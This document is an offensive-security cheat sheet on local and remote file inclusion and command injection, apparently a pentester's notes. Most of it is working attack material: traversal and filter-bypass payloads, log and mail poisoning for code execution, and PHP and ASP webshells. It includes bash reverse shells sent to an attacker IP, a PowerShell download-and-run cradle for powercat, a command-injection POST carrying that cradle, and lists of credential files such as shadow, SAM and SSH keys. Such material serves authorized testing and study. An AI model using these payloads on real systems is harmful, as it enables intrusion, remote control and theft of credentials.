# Description

Local File Inclusion (LFI) and Remote File Inclusion (RFI) are vulnerabilities that are often found to affect web applications that rely on a scripting run time. It allows someone to read/execute files on the server by exploiting file inclusion mechanisms.

>A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.

# Local File Inclusion (LFI)

## Scanning for LFI

-   URL LFI **Example**:

```bash
http://<target_url>/file.php?recurse=<file_name>
```

-   **Normal Fuzzing**:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

-   **Fuzz `GET` Parameters**:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

-   **Fuzz PHP Files**:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

-   **Fuzz Webroot**: to fuzz for index.php use [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [wordlist for windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt), or this [general wordlist alternative](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt); consider that depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our index.php afterwords.

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

-   **Fuzz Server Logs and Configs**: we can use the same wordlists as before.

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

## Bypassing LFI Protections

Sometimes protections are in place to prevent directory traversal. These are common techniques to bypass such restrictions:

```bash fold
# URL encoding bypass
http://<target_url>/file.php?recurse=../../../../../etc/passwd% 

# Null byte injection bypass
http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte

# Avoiding ..
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
http://<target_url>/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd

# Double URL encoding
http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd

# Repeated slashes bypass
http://<target_url>/file.php?recurse=....//....//....//etc/passwd

# Viewing a file with null byte injection
http://<target_url>/file.php?recurse=../../../../../etc/passwd%00

# Bypass file extension restrictions
http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg

# Retrieve system environment variables
http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```

## LFI Wrappers

Wrappers are mechanisms that let you change the file processing behavior to reveal sensitive data or interact with server components:

-   **Base64 encode a file:**

```bash
http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>

# Decode base64-encoded output
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
```

-   **ROT13 encoding:**

```bash
http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
```

-   **PHP Wrapper:**

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
```

## Remote Code Execution via LFI

### Log Poisoning (Apache or SSH Logs)

If log files such as `/var/log/apache2/access.log` or `/var/log/auth.log` are accessible through LFI, you can inject malicious code into the logs to achieve RCE.

1.  Verify if log files can be accessed via LFI:

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
```

2.  Inject a malicious PHP payload into the logs via SSH:

```bash
ssh "<?php system('whoami'); ?>"@<target>
```

3.  Access the log file via LFI to execute the payload:

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
```

### Mail PHP Execution (RCE via Email)

Using LFI, after enumerating users (e.g., `/etc/passwd`), you can attempt to execute PHP code through a mail server by embedding PHP in email data.

1.  Connect to the mail server:

```bash
telnet <target_ip> 25
```

2.  Inject PHP payload into the email service:

```bash
HELO localhost
MAIL FROM:<root>
RCPT TO:<www-data>
DATA
<?php echo shell_exec($_REQUEST['cmd']); ?>
.
```

3.  If unsure about the users on the system, perform user enumeration:

```bash
smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
```

## Reverse Shell via LFI

You can use `/proc/self/environ` to inject a shell. If the environment variables are writable, inject PHP code into the environment.

1.  Send the PHP payload:

```bash
curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```

2.  Access the file via LFI to trigger the reverse shell:

```bash
http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```

## Useful Tools

-   **LFISuite**: A tool to automate exploitation of LFI vulnerabilities.

```bash
git clone https://github.com/D35m0nd142/LFISuite
```

-   **RFIScanner**: A simple Python-based RFI vulnerability scanner.

```bash
python rfiscanner.py <target_url>
```

# Remote File Inclusion (RFI)

Remote File Inclusion (RFI) allows attackers to include external files into the web server’s execution context, potentially leading to Remote Code Execution (RCE).

## Basic RFI Example

If a web application allows including a remote file, you can execute arbitrary code by referencing an external malicious script:

```bash
# This assumes the server's allow_url_fopen or allow_url_include settings are enabled.
http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
```

## Reverse Shell via RFI

1.  **Start a Simple HTTP Server**:

```bash
python3 -m http.server 80
```

2.  **Host the malicious PHP reverse shell (e.g., `revshell.php`) on your own server**:

```bash
# Option 1: Reverse Shell via PHP
<?php system($_GET['cmd']); ?>

# Option 2: Reverse Shell via Bash
bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
```

3.  **Perform Remote File Inclusion**:

```bash
curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
```

# WordPress Plugin for Reverse Shell

If you gain access to an admin WordPress panel, you can navigate to **Theme > Appearance > Editor > 404 Template**. There, you can modify the PHP code to include your malicious web shell. For example, refer to Section for the code that allows you to access the shell at: `http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]`.

Alternatively, you can use the payload `multi-os-php-reverse-shell.php`, which automatically triggers a reverse shell when accessed. For a more complex approach, you could use a GitHub tool to create a malicious plugin, upload it, and obtain the reverse shell, as described in the below Sections

## Malicious WordPress Plugin Generators

-   [With Meterpreter](https://github.com/wetw0rk/malicious-wordpress-plugin)
-   [Without Meterpreter](https://github.com/Jsmoreira02/Pwn_Wordpress)

## Reverse Shell Options

-   [Two Reverse Shell Options](https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/)
-   [WordPress Backdoor Exploit](https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/)

### PHP Webshell

```bash
<?php system($_GET['cmd']); ?>
```

### ASP Webshell

```bash
<% eval request('cmd') %>
```

## Non-Meterpreter Payload for Netcat

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
```

# Files and Paths to Target (LFI & RFI)

## Common Linux Files

```bash fold
# Popular Files
/etc/passwd                       # Contains user accounts
/etc/shadow                       # Stores hashed user passwords
/var/www/html/wp-config.php       # WordPress configuration
/proc/self/environ                # Environment variables (can contain session tokens)

# Additional Options
/etc/passwd
/etc/shadow
/etc/hosts
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/etc/apache2/sites-available/000-default.conf
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/proc/self/environ
../wp-content/wp-config.php
/www/apache/conf/httpd.conf
```

## Common Windows Files

```bash fold
# Popular Files
C:\Windows\System32\drivers\etc\hosts          # Hosts file
C:\xampp\apache\logs\access.log                # Apache access logs
C:\xampp\php\php.ini                           # PHP configuration file
C:\Users\Administrator\NTUser.dat              # Windows user data
C:\Windows\System32\config\SAM                 # Security Account Manager database (passwords)
C:\Windows\System32\winevt\Logs\Security.evtx  # Security event logs

# Additional Options
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

# PHP Wrappers

-   **`php://filter`**

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"

# Decode base64-encoded output
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
```

-   **`php://data`**

```bash
curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"

# Encode PHP payload in base64:
echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
```

# OS Command Injection

-   **Detect Windows Commands Execution:**

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

-   **Download and Execute PowerCat Reverse Shell:**

```bash
IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell
```

-   **Executing Command Injection:**

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive
```

# Use Cases

You could test for this at any point where there's a file path that could possibly be influenced

# Related Notes

[MOC - Initial Access](../../0%20-%20MOCs/MOC%20-%20Initial%20Access.md)

# References

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)